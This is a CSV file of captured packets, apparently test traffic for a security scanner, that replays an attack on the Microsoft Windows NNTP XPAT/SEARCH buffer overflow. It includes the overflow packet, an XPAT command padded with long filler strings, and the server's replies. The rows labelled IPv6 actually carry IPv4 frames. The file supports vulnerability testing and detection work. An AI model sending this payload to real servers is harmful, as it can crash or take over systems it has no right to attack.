XmlName,ExecDesc,EngDesc,Protocol,SPECProtocol,Payload
﻿FSC20041015-01_Microsoft_Windows_NNTP_Component_Buffer_Overflow.xml,Microsoft Windows NNTP Component Buffer Overflow,A vulnerability exists in the Microsoft Windows Network News Transfer Protocol (NNTP) component. The vulnerability exists in the parsing and translating methods of the NNTP XPAT and SEARCH commands parameters. Leveraging this vulnerability could allow an attacker to execute arbitrary code on the target system.,NNTP,Ethernet,[[08 00 ]]E[[00 00 ]]<BN@[[00 ]]@[[06 E1 F8 0A 02 01 ]]<[[0A 02 01 ]]6[[81 BB 00 ]]w[[DE F9 ]]p[[BD 00 00 00 00 A0 02 16 D0 11 D9 00 00 02 04 05 B4 04 02 08 0A 04 0C ]]2[[F3 00 00 00 00 01 03 03 00]]
FSC20041015-01_Microsoft_Windows_NNTP_Component_Buffer_Overflow.xml,Microsoft Windows NNTP Component Buffer Overflow,A vulnerability exists in the Microsoft Windows Network News Transfer Protocol (NNTP) component. The vulnerability exists in the parsing and translating methods of the NNTP XPAT and SEARCH commands parameters. Leveraging this vulnerability could allow an attacker to execute arbitrary code on the target system.,NNTP,Ethernet,[[08 00 ]]E[[00 00 ]]4BO@[[00 ]]@[[06 E1 FF 0A 02 01 ]]<[[0A 02 01 ]]6[[81 BB 00 ]]w[[DE F9 ]]p[[BE 13 ]]*[[E2 88 80 10 16 D0 ]]J[[DB 00 00 01 01 08 0A 04 0C ]]2[[F3 00 00 00 00]]
FSC20041015-01_Microsoft_Windows_NNTP_Component_Buffer_Overflow.xml,Microsoft Windows NNTP Component Buffer Overflow,A vulnerability exists in the Microsoft Windows Network News Transfer Protocol (NNTP) component. The vulnerability exists in the parsing and translating methods of the NNTP XPAT and SEARCH commands parameters. Leveraging this vulnerability could allow an attacker to execute arbitrary code on the target system.,NNTP,Ethernet,[[08 00 ]]E[[00 00 ]]4BP@[[00 ]]@[[06 E1 FE 0A 02 01 ]]<[[0A 02 01 ]]6[[81 BB 00 ]]w[[DE F9 ]]p[[BE 13 ]]*[[E2 CA 80 10 16 D0 ]]\[[0C 00 00 01 01 08 0A 04 0C ]]2[[F3 00 02 EE 8A 08 00 ]]E[[00 00 ]]LBQ@[[00 ]]@[[06 E1 E5 0A 02 01 ]]<[[0A 02 01 ]]6[[81 BB 00 ]]w[[DE F9 ]]p[[BE 13 ]]*[[E2 CA 80 18 16 D0 E9 EB 00 00 01 01 08 0A 04 0C ]]2[[F3 00 02 EE 8A ]]GROUP control.newgroup[[0D 0A]]
FSC20041015-01_Microsoft_Windows_NNTP_Component_Buffer_Overflow.xml,Microsoft Windows NNTP Component Buffer Overflow,A vulnerability exists in the Microsoft Windows Network News Transfer Protocol (NNTP) component. The vulnerability exists in the parsing and translating methods of the NNTP XPAT and SEARCH commands parameters. Leveraging this vulnerability could allow an attacker to execute arbitrary code on the target system.,NNTP,Ethernet,[[08 00 ]]E[[00 05 DC ]]BR@[[00 ]]@[[06 DC ]]T[[0A 02 01 ]]<[[0A 02 01 ]]6[[81 BB 00 ]]w[[DE F9 ]]p[[D6 13 ]]*[[E2 E6 80 10 16 D0 93 A4 00 00 01 01 08 0A 04 0C ]]2[[F3 00 02 EE 8A ]]XPAT From 1-4 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[[08 00 ]]E[[00 04 8F ]]BS@[[00 ]]@[[06 DD A0 0A 02 01 ]]<[[0A 02 01 ]]6[[81 BB 00 ]]w[[DE F9 ]]v~[[13 ]]*[[E2 E6 80 18 16 D0 ]]@[[D9 00 00 01 01 08 0A 04 0C ]]2[[F3 00 02 EE 8A ]]AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB[[0D 0A]]
FSC20041015-01_Microsoft_Windows_NNTP_Component_Buffer_Overflow.xml,Microsoft Windows NNTP Component Buffer Overflow,A vulnerability exists in the Microsoft Windows Network News Transfer Protocol (NNTP) component. The vulnerability exists in the parsing and translating methods of the NNTP XPAT and SEARCH commands parameters. Leveraging this vulnerability could allow an attacker to execute arbitrary code on the target system.,NNTP,Ethernet,[[08 00 ]]E[[00 00 ]]@9[[14 ]]@[[00 80 06 AB ]].[[0A 02 01 ]]6[[0A 02 01 ]]<[[00 ]]w[[81 BB 13 ]]*[[E2 87 DE F9 ]]p[[BE B0 12 ]]Dp[[13 ]]o[[00 00 02 04 05 B4 01 03 03 00 01 01 08 0A 00 00 00 00 00 00 00 00 01 01 04 02]]
FSC20041015-01_Microsoft_Windows_NNTP_Component_Buffer_Overflow.xml,Microsoft Windows NNTP Component Buffer Overflow,A vulnerability exists in the Microsoft Windows Network News Transfer Protocol (NNTP) component. The vulnerability exists in the parsing and translating methods of the NNTP XPAT and SEARCH commands parameters. Leveraging this vulnerability could allow an attacker to execute arbitrary code on the target system.,NNTP,Ethernet,[[08 00 ]]E[[00 00 ]]v9[[15 ]]@[[00 80 06 AA F7 0A 02 01 ]]6[[0A 02 01 ]]<[[00 ]]w[[81 BB 13 ]]*[[E2 88 DE F9 ]]p[[BE 80 18 ]]Dp[[D6 ]]=[[00 00 01 01 08 0A 00 02 EE 8A 04 0C ]]2[[F3 ]]200 NNTP Service 6.0.3790.0 Version: 6.0.3790.0 Posting Allowed [[0D 0A]]
FSC20041015-01_Microsoft_Windows_NNTP_Component_Buffer_Overflow.xml,Microsoft Windows NNTP Component Buffer Overflow,A vulnerability exists in the Microsoft Windows Network News Transfer Protocol (NNTP) component. The vulnerability exists in the parsing and translating methods of the NNTP XPAT and SEARCH commands parameters. Leveraging this vulnerability could allow an attacker to execute arbitrary code on the target system.,NNTP,Ethernet,[[08 00 ]]E[[00 00 ]]P9[[16 ]]@[[00 80 06 AB 1C 0A 02 01 ]]6[[0A 02 01 ]]<[[00 ]]w[[81 BB 13 ]]*[[E2 CA DE F9 ]]p[[D6 80 18 ]]DX[[AC ]]][[00 00 01 01 08 0A 00 02 EE 8A 04 0C ]]2[[F3 ]]211 1 1 1 control.newgroup[[0D 0A]]
FSC20041015-01_Microsoft_Windows_NNTP_Component_Buffer_Overflow.xml,Microsoft Windows NNTP Component Buffer Overflow,A vulnerability exists in the Microsoft Windows Network News Transfer Protocol (NNTP) component. The vulnerability exists in the parsing and translating methods of the NNTP XPAT and SEARCH commands parameters. Leveraging this vulnerability could allow an attacker to execute arbitrary code on the target system.,NNTP,Ethernet,[[08 00 ]]E[[00 00 ]]49[[17 ]]@[[00 80 06 AB ]]7[[0A 02 01 ]]6[[0A 02 01 ]]<[[00 ]]w[[81 BB 13 ]]*[[E2 E6 DE F9 ]]z[[D9 80 10 ]]Dp$5[[00 00 01 01 08 0A 00 02 EE 8A 04 0C ]]2[[F3 08 00 ]]E[[00 00 ]](9;@[[00 80 06 AB 1F 0A 02 01 ]]6[[0A 02 01 ]]<[[00 ]]w[[81 BB 13 ]]*[[E2 E6 DE F9 ]]z[[D9 ]]P[[14 00 00 C7 ]]D[[00 00 01 01 08 0A 00 02]]
﻿FSC20041015-01_Microsoft_Windows_NNTP_Component_Buffer_Overflow_IPv6.xml,Microsoft Windows NNTP Component Buffer Overflow (IPv6 Version),A vulnerability exists in the Microsoft Windows Network News Transfer Protocol (NNTP) component. The vulnerability exists in the parsing and translating methods of the NNTP XPAT and SEARCH commands parameters. Leveraging this vulnerability could allow an attacker to execute arbitrary code on the target system. (IPv6 Version),NNTP/IPv6,Ethernet,[[08 00 ]]E[[00 00 ]]<BN@[[00 ]]@[[06 E1 F8 0A 02 01 ]]<[[0A 02 01 ]]6[[81 BB 00 ]]w[[DE F9 ]]p[[BD 00 00 00 00 A0 02 16 D0 11 D9 00 00 02 04 05 B4 04 02 08 0A 04 0C ]]2[[F3 00 00 00 00 01 03 03 00]]
FSC20041015-01_Microsoft_Windows_NNTP_Component_Buffer_Overflow_IPv6.xml,Microsoft Windows NNTP Component Buffer Overflow (IPv6 Version),A vulnerability exists in the Microsoft Windows Network News Transfer Protocol (NNTP) component. The vulnerability exists in the parsing and translating methods of the NNTP XPAT and SEARCH commands parameters. Leveraging this vulnerability could allow an attacker to execute arbitrary code on the target system. (IPv6 Version),NNTP/IPv6,Ethernet,[[08 00 ]]E[[00 00 ]]4BO@[[00 ]]@[[06 E1 FF 0A 02 01 ]]<[[0A 02 01 ]]6[[81 BB 00 ]]w[[DE F9 ]]p[[BE 13 ]]*[[E2 88 80 10 16 D0 ]]J[[DB 00 00 01 01 08 0A 04 0C ]]2[[F3 00 00 00 00]]
